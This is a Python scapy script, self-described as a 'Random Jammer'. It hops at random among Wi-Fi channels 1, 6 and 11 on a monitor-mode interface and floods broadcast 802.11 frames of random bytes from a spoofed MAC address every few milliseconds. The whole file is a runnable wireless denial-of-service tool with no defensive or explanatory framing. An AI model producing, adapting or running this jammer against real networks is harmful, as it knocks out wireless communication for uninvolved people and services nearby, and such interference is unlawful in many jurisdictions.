#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
from collections import namedtuple
import random
import time
import struct
import os
import sys

# --- 1. Basic Configuration ---
# Make sure 'mon0' has already been configured in monitor mode
# using airmon-ng or iw before running this script.
INTERFACE = "mon0"
CHANNELS = [1, 6, 11]

# os.system("iw dev %s set power_save off" % INTERFACE)

# Initialize L2 socket
try:
    s = conf.L2socket(iface=INTERFACE)
except Exception as e:
    print("[!] Error: Could not open socket on %s. Check if interface is up." % INTERFACE)
    print("[!] Details: %s" % e)
    sys.exit(1)

prep = None

# Data structure: Timestamp, Channel, Power, Period(ms), Length(bytes)
JamSetting = namedtuple("JamSetting", "timestamp channel power period length")

# Generate random signed-byte payload pool
bytelist = [random.randint(-128, 127) for _ in range(1526)]


def update(js):
    """
    Update hardware channel and rebuild the packet to be sent.
    """
    global prep

    # A. Hardware channel switching
    current_channel = int(js.channel)
    print("[-] Switching hardware to Channel %d" % current_channel)

    # os.system("iw dev %s set channel %d" % (INTERFACE, current_channel))
    os.system("nexutil -I %s -k%d" % (INTERFACE, current_channel))
    time.sleep(0.1)

    # B. Build packet: Radiotap + Dot11 + Raw
    rt = RadioTap(len=18, present="Flags+Rate+Channel+dBm_AntSignal+Antenna")
    rt.Rate = 2
    rt.Channel = current_channel
    rt.dBm_AntSignal = -1 * int(js.power)

    hdr = Dot11(
        addr1="ff:ff:ff:ff:ff:ff",
        addr2="00:11:22:33:44:55",
        addr3="00:11:22:33:44:55",
    )

    pkt_len = int(js.length)
    if pkt_len > 1400:
        pkt_len = 1400

    sub = bytelist[0:pkt_len]
    buf = struct.pack("%sb" % pkt_len, *sub)
    pl = Raw(load=buf)

    # Pre-build packet bytes to improve send efficiency
    pkt = rt / hdr / pl
    prep = pkt.build()

    print("[-] Config Updated: Ch=%d, Pwr=%s, PktLen=%d" % (current_channel, js.power, pkt_len))


# --- 2. Main Execution Loop ---

# Initial parameters:
# power=30, period=7ms, packet length=1400 bytes
current_js = JamSetting(timestamp=0, channel=1, power=30, period=7, length=1400)

print("--- Starting Random Jammer ---")
print("[*] Target Channels: %s" % CHANNELS)
print("[*] Random Stay Time: 1 to 10 seconds")

try:
    while True:
        # 1. Randomly select a target channel
        target_ch = random.choice(CHANNELS)

        # 2. Update configuration object
        current_js = JamSetting(
            timestamp=time.time(),
            channel=target_ch,
            power=current_js.power,
            period=current_js.period,
            length=current_js.length,
        )

        time.sleep(0.1)

        # 3. Switch hardware channel and rebuild packet
        update(current_js)

        # 4. Randomly decide how long to stay on this channel
        stay_time = random.uniform(1.0, 10.0)
        expiry = time.time() + stay_time

        print("[!] Hopping to Ch %d | Staying for %.2f seconds..." % (target_ch, stay_time))

        # 5. Keep sending packets during the stay time
        while time.time() < expiry:
            if current_js.power != 0 and prep is not None:
                s.send(prep)

            # Keep the configured packet interval
            if current_js.period > 0:
                time.sleep(current_js.period / 1000.0)

except KeyboardInterrupt:
    print("\n[+] User requested stop. Exiting...")
except Exception as e:
    print("\n[!] Runtime Error: %s" % e)
    sys.exit(1)
